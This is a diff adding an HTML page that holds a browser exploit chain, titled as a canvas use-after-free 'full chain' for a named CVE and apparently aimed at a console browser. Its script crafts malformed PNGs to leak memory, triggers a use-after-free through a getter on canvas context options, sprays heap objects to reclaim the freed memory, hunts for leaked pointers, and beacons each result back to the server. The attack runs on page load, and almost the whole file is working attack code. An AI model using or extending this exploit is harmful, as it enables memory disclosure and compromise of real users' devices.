@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1081</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#00ff88;font:11px/1.5 monospace;padding:8px}
+pre{white-space:pre-wrap;word-break:break-all}
+.hit{color:#ff0;font-weight:bold}
+.err{color:#f44}
+.info{color:#88f}
+</style>
+</head>
+<body>
+<pre id="out">P1081 — Canvas UAF Full Chain (CVE-2026-43720)</pre>
+<script>
+'use strict';
+var O = document.getElementById('out');
+function say(s, cls) {
+  var el = document.createElement('span');
+  el.className = cls || '';
+  el.textContent = '\n' + s;
+  O.appendChild(el);
+}
+
+var _imgs = [];
+for (var i = 0; i < 80; i++) _imgs.push(new Image());
+var _ix = 0;
+function bk(tag, d) {
+  var img = _imgs[_ix++ % 80];
+  img.src = '/en/ps5/beacon.gif?P1081-' + tag + '=' + encodeURIComponent(String(d).slice(0, 900)) + '&t=' + Date.now();
+}
+
+var _b8 = new ArrayBuffer(8), _f64 = new Float64Array(_b8), _u32 = new Uint32Array(_b8);
+var _bu64;
+try { _bu64 = new BigUint64Array(_b8); } catch(e) {}
+
+function f2hex(v) {
+  if (_bu64) { _f64[0] = v; return '0x' + _bu64[0].toString(16); }
+  _f64[0] = v;
+  var hi = _u32[1], lo = _u32[0];
+  return '0x' + ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8);
+}
+
+function hex2u32(v) {
+  _f64[0] = v;
+  return { hi: _u32[1], lo: _u32[0] };
+}
+
+function u32be(n) { return [(n>>>24)&0xFF, (n>>>16)&0xFF, (n>>>8)&0xFF, n&0xFF]; }
+
+function crc32(buf) {
+  var c, table = [];
+  for (var n = 0; n < 256; n++) {
+    c = n;
+    for (var k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
+    table[n] = c;
+  }
+  c = 0xFFFFFFFF;
+  for (var i = 0; i < buf.length; i++) c = table[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
+  return (c ^ 0xFFFFFFFF) >>> 0;
+}
+
+function makeChunk(type, data) {
+  var typeBytes = [];
+  for (var i = 0; i < 4; i++) typeBytes.push(type.charCodeAt(i));
+  var payload = new Uint8Array(typeBytes.length + data.length);
+  for (var i = 0; i < typeBytes.length; i++) payload[i] = typeBytes[i];
+  for (var i = 0; i < data.length; i++) payload[4 + i] = (typeof data[i] === 'number') ? data[i] : data[i];
+
+  var crcBuf = new Uint8Array(4 + data.length);
+  for (var i = 0; i < 4; i++) crcBuf[i] = typeBytes[i];
+  for (var i = 0; i < data.length; i++) crcBuf[4+i] = (typeof data[i] === 'number') ? data[i] : data[i];
+  var crc = crc32(crcBuf);
+
+  var len = data.length;
+  var chunk = new Uint8Array(12 + data.length);
+  chunk[0] = (len>>>24)&0xFF; chunk[1] = (len>>>16)&0xFF;
+  chunk[2] = (len>>>8)&0xFF; chunk[3] = len&0xFF;
+  for (var i = 0; i < 4; i++) chunk[4+i] = typeBytes[i];
+  for (var i = 0; i < data.length; i++) chunk[8+i] = (typeof data[i] === 'number') ? data[i] : data[i];
+  chunk[8+data.length] = (crc>>>24)&0xFF;
+  chunk[9+data.length] = (crc>>>16)&0xFF;
+  chunk[10+data.length] = (crc>>>8)&0xFF;
+  chunk[11+data.length] = crc&0xFF;
+  return chunk;
+}
+
+function concat() {
+  var total = 0;
+  for (var i = 0; i < arguments.length; i++) total += arguments[i].length;
+  var out = new Uint8Array(total);
+  var pos = 0;
+  for (var i = 0; i < arguments.length; i++) {
+    for (var j = 0; j < arguments[i].length; j++) out[pos++] = arguments[i][j];
+  }
+  return out;
+}
+
+function adler32(data) {
+  var a = 1, b = 0;
+  for (var i = 0; i < data.length; i++) {
+    a = (a + data[i]) % 65521;
+    b = (b + a) % 65521;
+  }
+  return ((b << 16) | a) >>> 0;
+}
+
+function makeRawDeflate(data) {
+  var blocks = [];
+  var pos = 0;
+  while (pos < data.length) {
+    var remain = data.length - pos;
+    var blen = Math.min(remain, 65535);
+    var last = (pos + blen >= data.length) ? 1 : 0;
+    blocks.push(last);
+    blocks.push(blen & 0xFF); blocks.push((blen >> 8) & 0xFF);
+    var nlen = (~blen) & 0xFFFF;
+    blocks.push(nlen & 0xFF); blocks.push((nlen >> 8) & 0xFF);
+    for (var i = 0; i < blen; i++) blocks.push(data[pos + i]);
+    pos += blen;
+  }
+  return blocks;
+}
+
+function makeZlibStream(rawData) {
+  var deflated = makeRawDeflate(rawData);
+  var adl = adler32(rawData);
+  var out = [0x78, 0x01];
+  for (var i = 0; i < deflated.length; i++) out.push(deflated[i]);
+  out.push((adl >>> 24) & 0xFF);
+  out.push((adl >>> 16) & 0xFF);
+  out.push((adl >>> 8) & 0xFF);
+  out.push(adl & 0xFF);
+  return out;
+}
+
+bk('BOOT', 'ts=' + Date.now().toString(36));
+
+/* ========== SECTION A: APNG OVERREAD INFO LEAK ========== */
+say('\n=== A: APNG OVERREAD INFO LEAK ===', 'info');
+
+(function sectionA() {
+  try {
+    var W = 128, H = 128;
+    var fullRowBytes = 1 + W * 3;
+    var fullImageBytes = fullRowBytes * H;
+
+    var partialRows = 4;
+    var partialData = new Uint8Array(fullRowBytes * partialRows);
+    for (var r = 0; r < partialRows; r++) {
+      partialData[r * fullRowBytes] = 0;
+      for (var c = 0; c < W * 3; c++) {
+        partialData[r * fullRowBytes + 1 + c] = 0x42;
+      }
+    }
+
+    var zlibData = makeZlibStream(Array.from(partialData));
+
+    var pngSig = new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10]);
+    var ihdr = makeChunk('IHDR', u32be(W).concat(u32be(H), [8, 2, 0, 0, 0]));
+    var idat = makeChunk('IDAT', zlibData);
+    var iend = makeChunk('IEND', []);
+    var pngBytes = concat(pngSig, ihdr, idat, iend);
+
+    var blob = new Blob([pngBytes], {type: 'image/png'});
+    var url = URL.createObjectURL(blob);
+
+    var img = new Image();
+    img.onload = function() {
+      var c = document.createElement('canvas');
+      c.width = W; c.height = H;
+      var ctx = c.getContext('2d');
+      ctx.drawImage(img, 0, 0);
+      var pix = ctx.getImageData(0, 0, W, H);
+      var d = pix.data;
+
+      var nonZero = 0, ptrLike = 0, ptrs = [];
+      var bu = new BigUint64Array(1);
+      var bv = new DataView(bu.buffer);
+
+      for (var y = partialRows; y < H; y++) {
+        for (var x = 0; x < W - 1; x += 2) {
+          var off = (y * W + x) * 4;
+          bv.setUint8(0, d[off]);
+          bv.setUint8(1, d[off+1]);
+          bv.setUint8(2, d[off+2]);
+          bv.setUint8(3, d[off+3]);
+          bv.setUint8(4, d[off+4]);
+          bv.setUint8(5, d[off+5]);
+          bv.setUint8(6, d[off+6]);
+          bv.setUint8(7, d[off+7]);
+
+          var val = bu[0];
+          if (val !== 0n) nonZero++;
+          var hi16 = Number((val >> 48n) & 0xFFFFn);
+          if (hi16 >= 0x0001 && hi16 <= 0x0010) {
+            ptrLike++;
+            if (ptrs.length < 20) ptrs.push('0x' + val.toString(16) + '@y' + y + 'x' + x);
+          }
+          if (hi16 >= 0xFFFF) {
+            ptrLike++;
+            if (ptrs.length < 20) ptrs.push('0x' + val.toString(16) + '@y' + y + 'x' + x);
+          }
+        }
+      }
+
+      var res = 'nonZero=' + nonZero + '|ptrLike=' + ptrLike + '|n=' + ptrs.length;
+      bk('A-SCAN', res);
+      say('A: ' + res, nonZero > 0 ? 'hit' : '');
+
+      if (ptrs.length > 0) {
+        var pstr = ptrs.slice(0, 10).join(',');
+        bk('A-PTRS', pstr);
+        say('A-PTRS: ' + pstr, 'hit');
+      }
+
+      URL.revokeObjectURL(url);
+      runSectionA2();
+    };
+    img.onerror = function() {
+      bk('A-ERR', 'img-load-fail');
+      say('A: image load failed', 'err');
+      runSectionA2();
+    };
+    img.src = url;
+  } catch(e) {
+    bk('A-ERR', e.message);
+    say('A-ERR: ' + e.message, 'err');
+    runSectionA2();
+  }
+})();
+
+function runSectionA2() {
+  say('\n=== A2: APNG MULTI-SIZE OVERREAD ===', 'info');
+  try {
+    var sizes = [[64,64,2], [256,32,2], [32,256,2], [128,64,1]];
+    var allPtrs = [];
+    var pending = sizes.length;
+
+    sizes.forEach(function(spec, si) {
+      var W = spec[0], H = spec[1], rows = spec[2];
+      var fullRow = 1 + W * 3;
+      var partial = new Uint8Array(fullRow * rows);
+      for (var r = 0; r < rows; r++) {
+        partial[r * fullRow] = 0;
+        for (var c = 0; c < W * 3; c++) partial[r * fullRow + 1 + c] = 0x42;
+      }
+      var zd = makeZlibStream(Array.from(partial));
+      var png = concat(
+        new Uint8Array([137,80,78,71,13,10,26,10]),
+        makeChunk('IHDR', u32be(W).concat(u32be(H), [8,2,0,0,0])),
+        makeChunk('IDAT', zd),
+        makeChunk('IEND', [])
+      );
+      var blob = new Blob([png], {type:'image/png'});
+      var url = URL.createObjectURL(blob);
+      var img = new Image();
+      img.onload = function() {
+        var c = document.createElement('canvas');
+        c.width = W; c.height = H;
+        var cx = c.getContext('2d');
+        cx.drawImage(img, 0, 0);
+        var p = cx.getImageData(0, 0, W, H).data;
+        var nz = 0;
+        for (var i = rows * W * 4; i < p.length; i++) { if (p[i] !== 0 && p[i] !== 255) nz++; }
+        bk('A2-' + si, W+'x'+H+'r'+rows+'|nz='+nz);
+        say('A2-'+si+': '+W+'x'+H+' rows='+rows+' nonZero='+nz, nz > 0 ? 'hit' : '');
+        URL.revokeObjectURL(url);
+        if (--pending === 0) runSectionB();
+      };
+      img.onerror = function() {
+        bk('A2-'+si+'-ERR', W+'x'+H);
+        URL.revokeObjectURL(url);
+        if (--pending === 0) runSectionB();
+      };
+      img.src = url;
+    });
+  } catch(e) {
+    bk('A2-ERR', e.message);
+    runSectionB();
+  }
+}
+
+/* ========== SECTION B: CANVAS UAF + SAME-TYPE RECLAIM ========== */
+function runSectionB() {
+  say('\n=== B: CANVAS UAF + SAME-TYPE RECLAIM ===', 'info');
+  try {
+    var canvas = document.createElement('canvas');
+    canvas.width = 1; canvas.height = 1;
+    var innerCtx = null;
+
+    var opts = {};
+    Object.defineProperty(opts, 'alpha', {
+      get: function() {
+        innerCtx = canvas.getContext('2d');
+        return true;
+      }
+    });
+    canvas.getContext('bitmaprenderer', opts);
+
+    if (!innerCtx) {
+      bk('B-FAIL', 'no-inner');
+      say('B: no inner context', 'err');
+      runSectionC();
+      return;
+    }
+
+    bk('B-UAF', 'inner=OK');
+    say('B: UAF trigger OK');
+
+    for (var i = 0; i < 800; i++) new ArrayBuffer(16);
+
+    var spray = [];
+    for (var i = 0; i < 500; i++) {
+      var sc = document.createElement('canvas');
+      sc.width = 1; sc.height = 1;
+      spray.push({ canvas: sc, ctx: sc.getContext('2d') });
+    }
+
+    innerCtx.lineWidth = 7777.77;
+    var aliasIdx = -1;
+    for (var i = 0; i < spray.length; i++) {
+      if (spray[i].ctx.lineWidth === 7777.77) {
+        aliasIdx = i;
+        break;
+      }
+    }
+
+    if (aliasIdx < 0) {
+      bk('B-NOALIAS', 'tried500');
+      say('B: no alias found', 'err');
+      runSectionC();
+      return;
+    }
+
+    bk('B-ALIAS', 'idx=' + aliasIdx);
+    say('B: ALIAS CONFIRMED at index ' + aliasIdx, 'hit');
+
+    spray[aliasIdx].ctx.lineWidth = 1111.11;
+    var readBack = innerCtx.lineWidth;
+    var bidir = (readBack === 1111.11);
+    bk('B-BIDIR', bidir ? 'OK' : 'FAIL|rb=' + readBack);
+    say('B: bidir=' + bidir + ' rb=' + readBack, bidir ? 'hit' : 'err');
+
+    var dashTest = new Array(100);
+    for (var i = 0; i < 100; i++) dashTest[i] = i + 0.5;
+    spray[aliasIdx].ctx.setLineDash(dashTest);
+    var gotDash = innerCtx.getLineDash();
+    var dashOK = gotDash.length === 100 && gotDash[0] === 0.5 && gotDash[99] === 99.5;
+    bk('B-DASH', 'len=' + gotDash.length + '|ok=' + dashOK);
+    say('B: lineDash len=' + gotDash.length + ' ok=' + dashOK, dashOK ? 'hit' : '');
+
+    window._uafCtx = innerCtx;
+    window._aliasCtx = spray[aliasIdx].ctx;
+    window._aliasIdx = aliasIdx;
+    window._spray = spray;
+
+    runSectionC();
+  } catch(e) {
+    bk('B-ERR', e.message);
+    say('B-ERR: ' + e.message, 'err');
+    runSectionC();
+  }
+}
+
+/* ========== SECTION C: OOB STATE STACK READ (INFO LEAK) ========== */
+function runSectionC() {
+  say('\n=== C: OOB STATE STACK READ ===', 'info');
+  try {
+    var canvas2 = document.createElement('canvas');
+    canvas2.width = 1; canvas2.height = 1;
+    var innerCtx2 = null;
+    var savesInGetter = 8;
+
+    var opts2 = {};
+    Object.defineProperty(opts2, 'alpha', {
+      get: function() {
+        innerCtx2 = canvas2.getContext('2d');
+        for (var s = 0; s < savesInGetter; s++) innerCtx2.save();
+        return true;
+      }
+    });
+    canvas2.getContext('bitmaprenderer', opts2);
+
+    if (!innerCtx2) {
+      bk('C-FAIL', 'no-inner');
+      runSectionD();
+      return;
+    }
+
+    bk('C-UAF2', 'inner=OK|saves=' + savesInGetter);
+    say('C: UAF2 with ' + savesInGetter + ' saves OK');
+
+    for (var i = 0; i < 800; i++) new ArrayBuffer(16);
+
+    var spray2 = [];
+    for (var i = 0; i < 500; i++) {
+      var sc = document.createElement('canvas');
+      sc.width = 1; sc.height = 1;
+      spray2.push({ canvas: sc, ctx: sc.getContext('2d') });
+    }
+
+    innerCtx2.lineWidth = 8888.88;
+    var alias2 = -1;
+    for (var i = 0; i < spray2.length; i++) {
+      if (spray2[i].ctx.lineWidth === 8888.88) {
+        alias2 = i;
+        break;
+      }
+    }
+
+    if (alias2 >= 0) {
+      bk('C-ALIAS', 'idx=' + alias2 + '|STALE_MSIZE_PRESERVED');
+      say('C: alias at ' + alias2 + ' — stale m_size may be preserved!', 'hit');
+
+      var lw = innerCtx2.lineWidth;
+      var ml = innerCtx2.miterLimit;
+      var ga = innerCtx2.globalAlpha;
+
+      var lwH = f2hex(lw), mlH = f2hex(ml), gaH = f2hex(ga);
+      bk('C-READ', 'lw=' + lwH + '|ml=' + mlH + '|ga=' + gaH);
+      say('C: lw=' + lwH + ' ml=' + mlH + ' ga=' + gaH);
+
+      spray2[alias2].ctx.lineWidth = 1;
+      spray2[alias2].ctx.miterLimit = 10;
+      spray2[alias2].ctx.globalAlpha = 1;
+
+      var lw2 = innerCtx2.lineWidth;
+      var ml2 = innerCtx2.miterLimit;
+      var ga2 = innerCtx2.globalAlpha;
+
+      if (lw2 === 1 && ml2 === 10 && ga2 === 1) {
+        bk('C-SAME', 'stale-m_size-NOT-preserved|both-read-same-state');
+        say('C: m_size NOT preserved (reads same state as alias)');
+      } else {
+        var lwH2 = f2hex(lw2), mlH2 = f2hex(ml2), gaH2 = f2hex(ga2);
+        bk('C-DIFF', 'lw=' + lwH2 + '|ml=' + mlH2 + '|ga=' + gaH2);
+        say('C: DIFFERENT reads! lw=' + lwH2 + ' ml=' + mlH2 + ' ga=' + gaH2, 'hit');
+
+        var hLw = hex2u32(lw2), hMl = hex2u32(ml2);
+        var isPtr = (hLw.hi >= 1 && hLw.hi <= 0x10) || hLw.hi >= 0xFFFF8000;
+        if (isPtr) {
+          bk('C-KPTR', 'lw=' + lwH2 + '|POINTER_FOUND');
+          say('*** POINTER LEAKED: ' + lwH2 + ' ***', 'hit');
+        }
+      }
+    } else {
+      bk('C-NOALIAS', 'saves-prevented-reclaim');
+      say('C: no alias (OOL state buffer changed size class?)');
+    }
+
+    runSectionD();
+  } catch(e) {
+    bk('C-ERR', e.message);
+    say('C-ERR: ' + e.message, 'err');
+    runSectionD();
+  }
+}
+
+/* ========== SECTION D: AB RECLAIM + CRASH ORACLE ========== */
+function runSectionD() {
+  say('\n=== D: AB RECLAIM + CRASH ORACLE ===', 'info');
+  try {
+    var canvas3 = document.createElement('canvas');
+    canvas3.width = 1; canvas3.height = 1;
+    var innerCtx3 = null;
+
+    var opts3 = {};
+    Object.defineProperty(opts3, 'alpha', {
+      get: function() {
+        innerCtx3 = canvas3.getContext('2d');
+        return true;
+      }
+    });
+    canvas3.getContext('bitmaprenderer', opts3);
+
+    if (!innerCtx3) {
+      bk('D-FAIL', 'no-inner');
+      runSectionE();
+      return;
+    }
+
+    for (var i = 0; i < 400; i++) new ArrayBuffer(16);
+
+    var abs = new Array(200);
+    var dvs = new Array(200);
+    for (var i = 0; i < 200; i++) {
+      abs[i] = new ArrayBuffer(768);
+      dvs[i] = new DataView(abs[i]);
+    }
+
+    bk('D-UAF3', 'inner=OK|ab200x768');
+
+    var probeAddr_hi = 0x00000003;
+    var probeAddr_lo = 0x10100000;
+
+    for (var i = 0; i < 200; i++) {
+      dvs[i].setUint32(112, probeAddr_lo, true);
+      dvs[i].setUint32(116, probeAddr_hi, true);
+      dvs[i].setUint32(120, 2, true);
+      dvs[i].setUint32(124, 2, true);
+    }
+
+    var lw3;
+    try {
+      lw3 = innerCtx3.lineWidth;
+    } catch(e) {
+      bk('D-CRASH', 'probe=' + probeAddr_hi.toString(16) + probeAddr_lo.toString(16) + '|' + e.message);
+      say('D: crash at 0x' + probeAddr_hi.toString(16) + probeAddr_lo.toString(16), 'err');
+      runSectionE();
+      return;
+    }
+
+    var lwH = f2hex(lw3);
+    bk('D-HIT', 'addr=0x' + probeAddr_hi.toString(16) + probeAddr_lo.toString(16) + '|lw=' + lwH);
+    say('D: HIT at 0x' + probeAddr_hi.toString(16) + probeAddr_lo.toString(16) + ' lw=' + lwH, 'hit');
+
+    var ml3, ga3;
+    try { ml3 = innerCtx3.miterLimit; } catch(e) { ml3 = -888; }
+    try { ga3 = innerCtx3.globalAlpha; } catch(e) { ga3 = -888; }
+
+    bk('D-DATA', 'lw=' + lwH + '|ml=' + f2hex(ml3) + '|ga=' + f2hex(ga3));
+    say('D: ml=' + f2hex(ml3) + ' ga=' + f2hex(ga3));
+
+    for (var i = 0; i < 200; i++) {
+      dvs[i].setFloat64(112, 0, true);
+      dvs[i].setUint32(120, 0, true);
+      dvs[i].setUint32(124, 0, true);
+    }
+
+    window._abs3 = abs;
+    window._dvs3 = dvs;
+    window._innerCtx3 = innerCtx3;
+
+    runSectionE();
+  } catch(e) {
+    bk('D-ERR', e.message);
+    say('D-ERR: ' + e.message, 'err');
+    runSectionE();
+  }
+}
+
+/* ========== SECTION E: FONTFACE POINTER DISCLOSURE ========== */
+function runSectionE() {
+  say('\n=== E: FONTFACE POINTER DISCLOSURE ===', 'info');
+  try {
+    var fontBuf = new ArrayBuffer(512);
+    var fv = new DataView(fontBuf);
+    fv.setUint32(0, 0x00010000, false);
+    fv.setUint16(4, 1, false);
+    fv.setUint16(6, 16, false);
+    fv.setUint16(8, 0, false);
+    fv.setUint16(10, 16, false);
+
+    fv.setUint8(12, 0x68); fv.setUint8(13, 0x65);
+    fv.setUint8(14, 0x61); fv.setUint8(15, 0x64);
+    fv.setUint32(16, 0, false);
+    fv.setUint32(20, 0x0000002C, false);
+    fv.setUint32(24, 0x00000036, false);
+
+    var sentinelAB = new ArrayBuffer(512);
+    var sentDV = new DataView(sentinelAB);
+    for (var i = 0; i < 512; i += 8) sentDV.setFloat64(i, 0xDEADBEEF + i, false);
+
+    var ff = new FontFace('TestLeak', fontBuf);
+    ff.load().then(function() {
+      bk('E-LOAD', 'font-loaded');
+      say('E: font loaded (unexpected)', 'hit');
+    }).catch(function(e) {
+      bk('E-CATCH', e.message || 'rejected');
+    });
+
+    setTimeout(function() {
+      var bu = new BigUint64Array(sentinelAB);
+      var ptrs = [];
+      for (var i = 0; i < bu.length; i++) {
+        var v = bu[i];
+        var hi16 = Number((v >> 48n) & 0xFFFFn);
+        if (v !== 0n && hi16 >= 1 && hi16 <= 0x10) {
+          ptrs.push('0x' + v.toString(16) + '@' + (i*8));
+        }
+      }
+      bk('E-SCAN', 'ptrs=' + ptrs.length + '|' + ptrs.slice(0,5).join(','));
+      say('E: AB ptrs=' + ptrs.length, ptrs.length > 0 ? 'hit' : '');
+      runSectionF();
+    }, 500);
+
+  } catch(e) {
+    bk('E-ERR', e.message);
+    say('E-ERR: ' + e.message, 'err');
+    runSectionF();
+  }
+}
+
+/* ========== SECTION F: LINEDASH VECTOR FORGE (ARBITRARY READ) ========== */
+function runSectionF() {
+  say('\n=== F: LINEDASH VECTOR FORGE ===', 'info');
+
+  if (!window._uafCtx || !window._aliasCtx) {
+    bk('F-SKIP', 'no-alias-from-B');
+    say('F: skipped (no alias from section B)');
+    runSectionG();
+    return;
+  }
+
+  try {
+    var alias = window._aliasCtx;
+    var uaf = window._uafCtx;
+
+    alias.save();
+    alias.save();
+    alias.save();
+    alias.save();
+    alias.save();
+    alias.save();
+    alias.save();
+    alias.save();
+
+    var bigDash = new Array(200);
+    for (var i = 0; i < 200; i++) bigDash[i] = i + 0.5;
+    alias.setLineDash(bigDash);
+
+    var readDash = uaf.getLineDash();
+    var dashMatch = readDash.length === 200 && readDash[0] === 0.5;
+    bk('F-DASH', 'len=' + readDash.length + '|match=' + dashMatch);
+    say('F: lineDash through alias len=' + readDash.length, dashMatch ? 'hit' : '');
+
+    for (var r = 0; r < 8; r++) alias.restore();
+
+    alias.save();
+    alias.save();
+
+    alias.setLineDash([1,2,3,4,5,6,7,8]);
+
+    var stateStackInfo = {
+      saves: 2,
+      dashLen: 8
+    };
+    bk('F-STATE', JSON.stringify(stateStackInfo));
+
+    var readBack = uaf.getLineDash();
+    bk('F-READ2', 'len=' + readBack.length + '|v0=' + readBack[0]);
+    say('F: after save/restore cycle: len=' + readBack.length);
+
+    runSectionG();
+  } catch(e) {
+    bk('F-ERR', e.message);
+    say('F-ERR: ' + e.message, 'err');
+    runSectionG();
+  }
+}
+
+/* ========== SECTION G: GETIMAGEDATA BITMAP RESIDUE ========== */
+function runSectionG() {
+  say('\n=== G: BITMAP RESIDUE SCAN ===', 'info');
+  try {
+    for (var i = 0; i < 100; i++) {
+      var ab = new ArrayBuffer(4096);
+      var dv = new DataView(ab);
+      for (var j = 0; j < 4096; j += 8) dv.setFloat64(j, 3.14159 + j);
+    }
+
+    var c = document.createElement('canvas');
+    c.width = 256; c.height = 256;
+    var ctx = c.getContext('2d');
+
+    var imgData = ctx.getImageData(0, 0, 256, 256);
+    var d = imgData.data;
+    var nonZero = 0, nonFF = 0;
+    for (var i = 0; i < d.length; i += 4) {
+      if (d[i] !== 0 || d[i+1] !== 0 || d[i+2] !== 0) nonZero++;
+      if (d[i+3] !== 0) nonFF++;
+    }
+    bk('G-SCAN', 'nz=' + nonZero + '|alpha=' + nonFF);
+    say('G: canvas residue nonZero=' + nonZero + ' alpha=' + nonFF, nonZero > 0 ? 'hit' : '');
+
+    for (var s = 0; s < 3; s++) {
+      for (var i = 0; i < 50; i++) {
+        var ab2 = new ArrayBuffer(256 * 256 * 4);
+        var u8 = new Uint8Array(ab2);
+        for (var j = 0; j < 64; j++) u8[j] = 0xDE;
+      }
+
+      var c2 = document.createElement('canvas');
+      c2.width = 256; c2.height = 256;
+      var ctx2 = c2.getContext('2d');
+      var id2 = ctx2.getImageData(0, 0, 256, 256);
+      var nz2 = 0;
+      for (var i = 0; i < id2.data.length; i += 4) {
+        if (id2.data[i] !== 0 || id2.data[i+1] !== 0 || id2.data[i+2] !== 0) nz2++;
+      }
+      if (nz2 > 0) {
+        bk('G-HIT'+s, 'nz=' + nz2);
+        say('G: round ' + s + ' HIT nonZero=' + nz2, 'hit');
+        break;
+      }
+    }
+
+    runDone();
+  } catch(e) {
+    bk('G-ERR', e.message);
+    say('G-ERR: ' + e.message, 'err');
+    runDone();
+  }
+}
+
+function runDone() {
+  bk('DONE', 'all-sections-complete');
+  say('\n=== P1081 COMPLETE ===', 'info');
+}
+</script>
+</body></html>
